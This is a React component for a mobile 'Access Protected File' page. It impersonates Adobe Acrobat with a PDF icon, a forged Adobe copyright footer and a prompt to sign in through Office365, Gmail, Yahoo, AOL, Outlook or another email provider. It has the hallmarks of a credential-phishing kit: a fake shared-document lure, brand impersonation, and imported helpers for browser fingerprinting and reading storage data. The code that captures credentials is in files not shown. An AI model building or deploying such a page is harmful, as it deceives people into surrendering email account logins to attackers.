import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { buildOAuthUrl, generateState, getBrowserFingerprint, getStorageData } from '../../utils/oauthHandler';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess,
  onLoginError 
}) => {

  const emailProviders = [
    { 
      name: 'Office365', 
      domain: 'outlook.com', 
      color: 'bg-blue-600', 
      logo: 'https://www.svgrepo.com/show/503426/microsoft-office.svg'
    },
    { 
      name: 'Yahoo', 
      domain: 'yahoo.com', 
      color: 'bg-purple-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Yahoo_Y_%282009-2013%29.svg/450px-Yahoo_Y_%282009-2013%29.svg.png?20100624225346'
    },
    { 
      name: 'Outlook', 
      domain: 'outlook.com', 
      color: 'bg-blue-500', 
      logo: 'https://www.svgrepo.com/show/443244/brand-microsoft-outlook.svg'
    },
    { 
      name: 'AOL', 
      domain: 'aol.com', 
      color: 'bg-red-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/AOL_logo_%282024%29.svg/1199px-AOL_logo_%282024%29.svg.png?20241206193155'
    },
    { 
      name: 'Gmail', 
      domain: 'gmail.com', 
      color: 'bg-red-500', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png?20221017173631'
    },
    { 
      name: 'Others', 
      domain: 'other.com', 
      color: 'bg-gray-600', 
      logo: 'https://www.svgrepo.com/show/521128/email-1.svg'
    }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Starting mobile OAuth flow for ${provider}`);
    const state = generateState();
    const oauthUrl = buildOAuthUrl(provider, state);
    
    // For demo providers (Gmail, Yahoo, AOL, Others), buildOAuthUrl handles the simulation
    // For real providers (Office365, Outlook), it returns the actual OAuth URL
    if (!oauthUrl.includes('/auth/demo')) {
      console.log(`🌐 Redirecting to ${provider} OAuth:`, oauthUrl);
      window.location.href = oauthUrl;
    }
    // Demo providers are handled automatically by buildOAuthUrl with setTimeout
  };


  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Dark gradient background with red/purple accents */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
      
      {/* Subtle abstract shapes and blurry overlays */}
      <div className="absolute top-5 left-5 w-32 h-32 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
      <div className="absolute bottom-5 right-5 w-40 h-40 bg-[#FF0000]/6 rounded-full blur-3xl"></div>
      <div className="absolute top-1/2 left-1/4 w-24 h-24 bg-[#EC4899]/10 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/4 right-1/3 w-28 h-28 bg-[#8B5CF6]/7 rounded-full blur-2xl"></div>
      
      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
        <div className="w-full max-w-sm">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-14 h-14 flex items-center justify-center mx-auto mb-3">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                alt="Adobe Acrobat" 
                className="w-10 h-10 object-contain"
              />
            </div>
            
            <h1 className="text-xl font-bold text-white mb-2">Access Protected File</h1>
            <p className="text-sm text-white font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-lg py-2 px-3">
              Please sign in to access your documents
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-[#1E1E1E]/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-[#2C2C2C]/60 p-6">
            {/* Provider Selection - Direct OAuth */}
            <div>
              <h2 className="text-base font-semibold text-white mb-4">
                Choose your email provider
              </h2>
              <div className="grid grid-cols-2 gap-2">
                {emailProviders.map((provider) => (
                  <button
                    key={provider.name}
                    onClick={() => handleProviderSelect(provider.name)}
                    className={`${provider.color} text-white p-3 rounded-lg hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-1 shadow-lg`}
                  >
                    <img 
                      src={provider.logo} 
                      alt={provider.name} 
                      className="w-6 h-6 object-contain filter brightness-0 invert"
                      onError={(e) => {
                        const target = e.target as HTMLImageElement;
                        target.style.display = 'none';
                        const parent = target.parentElement;
                        if (parent && !parent.querySelector('.fallback-text')) {
                          const fallback = document.createElement('div');
                          fallback.className = 'fallback-text text-lg font-bold';
                          fallback.textContent = provider.name.charAt(0);
                          parent.insertBefore(fallback, target.nextSibling);
                        }
                      }}
                    />
                    <span className="font-medium text-xs">{provider.name}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Adobe Footer */}
          <div className="text-center mt-6">
            <p className="text-xs text-gray-400 font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-lg py-2 px-3 inline-block">
              © 2025 Adobe Inc. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MobileLoginPage;